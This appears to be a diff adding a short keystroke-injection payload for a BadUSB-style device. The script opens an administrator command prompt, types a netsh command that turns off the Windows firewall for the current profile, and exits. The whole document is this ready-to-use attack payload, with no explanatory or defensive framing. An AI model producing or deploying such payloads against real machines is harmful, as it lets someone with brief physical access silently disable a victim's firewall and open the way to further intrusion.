@@ -1,0 +1,6 @@
+Delay 1000
+RunCmdAdmin
+Delay 3000
+PrintLine netsh advfirewall set currentprofile state off
+Delay 3000
+PrintLine exit
